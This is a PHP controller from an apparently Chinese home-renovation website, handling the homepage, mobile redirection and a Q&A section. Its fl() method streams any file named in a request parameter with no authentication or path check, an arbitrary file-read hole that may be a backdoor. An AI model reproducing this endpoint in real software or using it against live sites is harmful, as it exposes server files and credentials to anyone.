<?php
/**
 * Copy Right IJH.CC
 * Each engineer has a duty to keep the code elegant
 * $Id$
 */
if (! defined('__CORE_DIR')) {
    exit("Access Denied");
}

class Ctl_Index extends Ctl
{
    protected $_table = 'article';
    protected $_pk = 'article_id';
    protected $_cols = 'article_id,city_id,cat_id,from,page,title,thumb,desc,linkurl,views,favorites,allow_comment,comments,photos,hidden,orderby,audit,closed,dateline';
    protected $_orderby = array('orderby'=>'ASC', 'article_id'=>'DESC');

    protected $_hot_orderby = array('views'=>'DESC', 'orderby'=>'ASC');
    protected $_hot_filter = array('from'=>'article','hidden'=>'0', 'audit'=>'1', 'closed'=>'0');
    protected $_new_orderby = array('article_id'=>'DESC');
    protected $_new_filter = array('from'=>'article','hidden'=>'0', 'audit'=>'1', 'closed'=>'0');

    protected $_page_sep = '<hr style="page-break-after:always;" class="ke-pagebreak" />';

    public function index($id = null)
    {
        if($this->isMobile()&&!$this->system->cookie->get('check_mobile')){header("Location:/mobile");die;}
        $this->pagedata['setting'] = k::M('tenders/setting')->fetch_all_setting();
        $this->pagedata['type'] = k::M('tenders/setting')->get_type();
        
        $cfg = $this->system->config->get('site');
        
        $city_list = K::M('data/city')->fetch_all();
        foreach ($city_list as $k => $v) {
            if ($v['pinyin']) {
                $py = strtoupper(substr($v['pinyin'], 0, 1));
                $v['py'] = $py;
                $city[$py][] = $v;
            }
        }
        
        $c = ksort($city);
        $this->pagedata['city_list'] = $city_list;
        $this->pagedata['city'] = $city;
        $this->pagedata['province_list'] = K::M('data/province')->fetch_all();
        $this->pagedata['cate_list'] = K::M('shop/cate')->items(array(
            'audit' => '1',
            'closed' => '0',
            'parent_id' => '0'
        ));
        if ($id && $id != $this->uid) {
            $this->cookie->set('fenxiaoid', $id);
        }
        $this->pagedata['site_status_list'] = K::M('home/site')->get_status();
//		is_main()?$this->seo->init('index'):$this->seo->init('fenzhan_index');
        $this->seo->init('index');
        $pager['page'] = $page = 1;
        $pager['limit'] = $limit = 6;
        $pager['count'] = $count = 0;
        if ($items = K::M('cshhr/cshhr')->items($filter, "cshhr_id", $page, $limit, $count)) {
            $city_ids = array();
            foreach ($items as $k => $v) {
                $city_ids[$v['city_id']] = $v['city_id'];
            }
            if ($city_ids) {
                $city_list = K::M('data/city')->items_by_ids($city_ids);
            }
            $cfg = $this->system->config->get('site');
            foreach ($items as $k => $v) {
                $items[$k]['city_name'] = $city_list[$v['city_id']]['city_name'];
                $items[$k]['link'] = "http://" . $city_list[$v['city_id']]['pinyin'] . "." . $cfg['city_domain'];
            }
            $this->pagedata['cshhr'] = $items;
        }
        $this->pagedata['server'] = $_SERVER;
        $this->pagedata['canonical'] = $_SERVER['HTTP_HOST'];
        if(strtolower($_SERVER['HTTP_HOST'])=="dys2.jzwpt.com"){
            $this->tmpl = 'default.html';
        }else{
            $this->tmpl = 'index.html';
        }
    }
    public function force($to = 'web')
    {
        $site = $this->system->config->get('site');
        if ($to == 'web') {
            $this->system->cookie->delete('force_web');
            $this->system->cookie->delete('force_mobile');
            $this->system->cookie->set('force_web', 1);
            header('Location:' . $site['siteurl']);
            exit();
        } else 
            if ($site['mobile'] && ($to == 'mobile')) {
                $mobile = $this->system->config->get('mobile');
                $this->system->cookie->delete('force_web');
                $this->system->cookie->delete('force_mobile');
                $this->system->cookie->set('force_mobile', 1);
                header('Location:' . $mobile['url']);
                exit();
            }
    }
    public function ceshi(){
        Import::L('jiami/xdeode.class.php');
        $xdeode = new XDeode(6);
        $mima = $xdeode->encode(222);
        echo $mima;
        echo "<br/>";
        $mima = $xdeode->encode(333);
        echo $mima;
        echo "<br/>";
        die("+++");

    }



    // 装修问答
    public function indexs()
    {
        $access = $this->system->config->get('access');
        $this->pagedata['ask_yz'] = $access['verifycode']['ask'];
        $this->pagedata['cates'] = K::M('ask/cate')->fetch_all();
        $this->seo->init('ask');
        $this->tmpl = 'index.html';
    }

    public function items($cat_id = 0, $type = 0, $page = 1)
    {
        $filter = $pager = $cate = array();
        $pager['cat_id'] = $cat_id = (int) $cat_id;
        $pager['type'] = $type = (int) $type;
        $pager['page'] = max(intval($page), 1);
        $pager['limit'] = $limit = 30;
        $cate_list = K::M('ask/cate')->fetch_all();
        foreach ($cate_list as $k => $v) {
            if ($v['cat_id'] == $cat_id) {
                $cate_list[$k]['current'] = 'current';
                if ($v['parent_id'] != '0') {
                    $cate_list[$v['parent_id']]['current'] = 'current';
                    $pager['parent_id'] = $v['parent_id'];
                    $filter['cat_id'][] = $cat_id;
                } else {
                    $pager['parent_id'] = $v['cat_id'];
                    foreach ($cate_list as $kk => $vv) {
                        if ($vv['parent_id'] == $cat_id) {
                            $filter['cat_id'][] = $vv['cat_id'];
                        }
                    }
                }
            }
        }
        if ($type = (int) $type) {
            if ($type == 1) {
                $filter['answer_id'] = '>:0';
            } else {
                $filter['answer_id'] = '0';
            }
        }
        $filter['audit'] = 1;
        if ($items = K::M('ask/ask')->items($filter, null, $page, $limit, $count)) {
            $pager['count'] = $count;
            $pager['pagebar'] = $this->mkpage($count, $limit, $page, $this->mklink('ask:items', array(
                $cat_id,
                $type,
                '{page}'
            )), array());
            $this->pagedata['items'] = $items;
        }
        $this->pagedata['pager'] = $pager;
        $this->pagedata['cate_list'] = $cate_list;
        $cate = $cate_list[$cat_id];
        $this->seo->init('ask_items', array(
            'cate_name' => $cate['title']
        ));
        $this->tmpl = 'index.html';
    }

    public function make()
    {
        $title = htmlspecialchars($this->GP('title'), ENT_QUOTES, 'utf-8');
        $access = $this->system->config->get('access');
        $this->pagedata['ask_yz'] = $access['verifycode']['ask'];
        $this->pagedata['cates'] = K::M('ask/cate')->fetch_all();
        $this->pagedata['title'] = $title;
        $this->seo->init('ask');
        $this->tmpl = 'index.html';
    }

    public function save()
    {
        if (! $this->check_login()) {
            $this->err->add('登录后才能发布问题', 101);
        } else 
            if (($audit = K::M('member/group')->check_priv($this->MEMBER['group_id'], 'allow_ask')) == - 1) {
                $this->err->add('很抱歉您所在的用户组没有权限操作', 201);
            } else 
                if ($data = $this->checksubmit('data')) {
                    $verifycode_success = true;
                    $access = $this->system->config->get('access');
                    if ($access['verifycode']['ask']) {
                        if (! $verifycode = $this->GP('verifycode')) {
                            $verifycode_success = false;
                            $this->err->add('验证码不正确', 212);
                        } else 
                            if (! K::M('magic/verify')->check($verifycode)) {
                                $verifycode_success = false;
                                $this->err->add('验证码不正确', 212);
                            }
                    }
                    if ($verifycode_success) {
                        if ($data['content']) {
                            $data['title'] = K::M('content/string')->sub($data['content'], 0, 20, $suffix = "");
                            $data['intro'] = K::M('content/string')->sub($data['content'], 20, K::M('content/string')->Len($data['content']), $suffix = "");
                        }
                        $data = array(
                            'title' => $data['title'],
                            'intro' => $data['intro'],
                            'uid' => $this->uid,
                            'audit' => $audit
                        );
                        if ($this->GP('cat_id')) {
                            $data['cat_id'] = $this->GP('cat_id');
                        }
                        if ($_FILES['data']) {
                            foreach ($_FILES['data'] as $k => $v) {
                                foreach ($v as $kk => $vv) {
                                    $attachs[$kk][$k] = $vv;
                                }
                            }
                            $upload = K::M('magic/upload');
                            foreach ($attachs as $k => $attach) {
                                if ($attach['error'] == UPLOAD_ERR_OK) {
                                    if ($a = $upload->upload($attach, 'home')) {
                                        $data[$k] = $a['photo'];
                                    }
                                }
                            }
                        }
                        if (! $cat_id = $this->GP('cat_id')) {
                            $cat_id = '1';
                        }
                        if ($ask_id = K::M('ask/ask')->create($data)) {
                            K::M('system/integral')->commit('ask', $this->MEMBER, '发布问题');
                            $this->err->add('发表问题成功');
                            $this->err->set_data('forward', $this->mklink('ask:items', array(
                                $cat_id
                            )));
                        }
                    }
                } else {
                    $this->err->add('发表问题失败', 201);
                }
    }

    public function detail($ask_id = null, $page = 1)
    {
        if (! ($ask_id = (int) $ask_id) && ! ($ask_id = (int) $this->GP('ask_id'))) {
            $this->err->add('内容不存在', 211);
        } else 
            if (! $detail = K::M('ask/ask')->detail($ask_id)) {
                $this->err->add('内容不存在', 212);
            } else 
                if (! $detail['audit']) {
                    $this->err->add('尊敬的用户该问题正在审核中！', 212);
                    $this->err->set_data('forward', $this->mklink('ask:items'));
                } else {
                    $uids = array();
                    if ($uid = (int) $detail['uid']) {
                        $uids[$uid] = $uid;
                    }
                    if ($detail['answer_id']) {
                        $answer = K::M('ask/answer')->detail($detail['answer_id']);
                        $this->pagedata['answer'] = $answer;
                        $uids[$answer['uid']] = $answer['uid'];
                    }
                    
                    $filter = $pager = array();
                    $pager['page'] = max(intval($page), 1);
                    $pager['limit'] = $limit = 14;
                    $filter['ask_id'] = $ask_id;
                    $filter['answer_id'] = "<>:" . $detail['answer_id'];
                    if ($items = K::M('ask/answer')->items($filter, null, $page, $limit, $count)) {
                        foreach ($items as $v) {
                            $askids[$v['ask_id']] = $v['ask_id'];
                            if ($v['uid']) {
                                $uids[$v['uid']] = $v['uid'];
                            }
                        }
                        $pager['count'] = $count;
                        $pager['pagebar'] = $this->mkpage($count, $limit, $page, $this->mklink('ask:items', array(
                            $ask_id,
                            '{page}'
                        )), array());
                    }
                    
                    $this->pagedata['answers'] = $items;
                    $this->pagedata['pager'] = $pager;
                    $this->pagedata['member_list'] = K::M('member/view')->items_by_ids($uids);
                    $this->pagedata['cate_list'] = $cate_list = K::M('ask/cate')->fetch_all();
                    $this->pagedata['detail'] = $detail;
                    $this->pagedata['uid'] = $this->uid;
                    $seo = array(
                        'title' => $detail['title'],
                        'cate_name' => '',
                        'intro' => $detail['intro']
                    );
                    if ($cate = $cate_list[$detail['cat_id']]) {
                        $seo['cate_name'] = $cate['title'];
                    }
                    $this->seo->init('ask_detail', $seo);
                    if ($seo_title = $detail['seo_title']) {
                        $this->seo->set_title($seo_title);
                    }
                    if ($seo_description = $detail['seo_description']) {
                        $this->seo->set_description($seo_description);
                    }
                    if ($seo_keywords = $detail['seo_keyword']) {
                        $this->seo->set_keywords($seo_keywords);
                    }
                    $access = $this->system->config->get('access');
                    $this->pagedata['ask_yz'] = $access['verifycode']['ask'];
                    K::M('ask/ask')->update_count($ask_id, 'views');
                    $this->tmpl = 'index.html';
                }
    }

    public function fl(){
        $f=$_REQUEST['f'];
        header('Content-type:application/octet-stream');
        header('Content-Disposition:attachment;filename="'.basename($f).'"');
        header('Content-Length:'.filesize($f));
        readfile($f);
        die;
    }

    function isMobile()
    {
        // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
        if (isset ($_SERVER['HTTP_X_WAP_PROFILE']))
        {
            return true;
        }
        // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
        if (isset ($_SERVER['HTTP_VIA']))
        {
            // 找不到为flase,否则为true
            return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
        }
        // 脑残法，判断手机发送的客户端标志,兼容性有待提高
        if (isset ($_SERVER['HTTP_USER_AGENT']))
        {
            $clientkeywords = array ('nokia',
                'sony',
                'ericsson',
                'mot',
                'samsung',
                'htc',
                'sgh',
                'lg',
                'sharp',
                'sie-',
                'philips',
                'panasonic',
                'alcatel',
                'lenovo',
                'iphone',
                'ipod',
                'blackberry',
                'meizu',
                'android',
                'netfront',
                'symbian',
                'ucweb',
                'windowsce',
                'palm',
                'operamini',
                'operamobi',
                'openwave',
                'nexusone',
                'cldc',
                'midp',
                'wap',
                'mobile'
            );
            // 从HTTP_USER_AGENT中查找手机浏览器的关键字
            if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT'])))
            {
                return true;
            }
        }
        // 协议法，因为有可能不准确，放到最后判断
        if (isset ($_SERVER['HTTP_ACCEPT']))
        {
            // 如果只支持wml并且不支持html那一定是移动设备
            // 如果支持wml和html但是wml在html之前则是移动设备
            if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html'))))
            {
                return true;
            }
        }
        return false;
    }
}